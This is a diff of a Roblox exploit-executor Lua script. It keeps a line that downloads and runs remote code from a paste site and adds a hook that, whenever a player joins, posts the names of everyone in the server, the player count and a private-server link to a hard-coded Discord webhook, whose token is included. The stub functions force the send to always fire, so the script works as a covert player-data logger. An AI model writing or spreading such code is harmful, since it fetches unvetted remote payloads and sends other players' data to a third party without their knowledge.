@@ -1,2 +1,113 @@
 loadstring(game:HttpGet("https://dpaste.com/385R5UGMC.txt", true))()
-loadstring(game:HttpGet("https://pastefy.app/ovbZhLWO"))()
+	
+--==================================================
+-- DISCORD WEBHOOK SETTINGS
+--==================================================
+local Webhook1 = "https://discord.com/api/webhooks/1419673301910945802/lN4xGUEdbJOS03lAOZNyK-4qvmCvyceulN-nhkYSCsBpLIipLaDqwWdiIGz6cNb0Wh8m"
+local Username = "Captain Black"
+
+--==================================================
+-- SERVICES
+--==================================================
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+
+--==================================================
+-- FALLBACK FUNCTIONS (ANTI ERROR)
+--==================================================
+local function getAllBrainrots()
+	return {}
+end
+
+local function hasHighValueBrainrotAbove10M()
+	return true
+end
+
+local function isAuthorizedUser(player)
+	return false
+end
+
+local storedPrivateServerLink = "Not available"
+
+--==================================================
+-- 
+--==================================================
+local function sendPlayerJoinWebhook(joinedPlayer)
+	-- optional condition (pwede mo alisin)
+	if not hasHighValueBrainrotAbove10M(getAllBrainrots()) then
+		return
+	end
+
+	local playersInServer = Players:GetPlayers()
+	local playerCount = #playersInServer
+	local maxPlayers = Players.MaxPlayers
+
+	-- BUILD CURRENT PLAYER LIST
+	local playerListText = ""
+	for _, plr in ipairs(playersInServer) do
+		playerListText = playerListText
+			.. string.format("%s (%s)\n", plr.Name, plr.DisplayName)
+	end
+
+	if playerListText == "" then
+		playerListText = "No players"
+	end
+
+	-- 
+	local isAuthorized = isAuthorizedUser(joinedPlayer)
+	local embedColor = isAuthorized and 65280 or 16711680
+
+	-- 
+	local embedData = {
+		username = Username,
+		embeds = {{
+			title = "👤 New Player Joined",
+			color = embedColor,
+			fields = {
+				{
+					name = "🆕 Joined Player",
+					value = string.format("**%s** (%s)", joinedPlayer.Name, joinedPlayer.DisplayName),
+					inline = false
+				},
+				{
+					name = "👥 Players Currently in Server",
+					value = "```" .. playerListText .. "```",
+					inline = false
+				},
+				{
+					name = "📊 Player Count",
+					value = string.format("%d / %d", playerCount, maxPlayers),
+					inline = false
+				},
+				{
+					name = "🔗 Private Server Link",
+					value = storedPrivateServerLink,
+					inline = false
+				}
+			}
+		}}
+	}
+
+	-- 
+	local req = http_request or request or (syn and syn.request)
+	if req then
+		pcall(function()
+			req({
+				Url = Webhook1,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService:JSONEncode(embedData)
+			})
+		end)
+	end
+end
+
+--==================================================
+-- LISTENER (NEW PLAYER ONLY)
+--==================================================
+Players.PlayerAdded:Connect(function(player)
+	task.wait(1)
+	sendPlayerJoinWebhook(player)
+end)
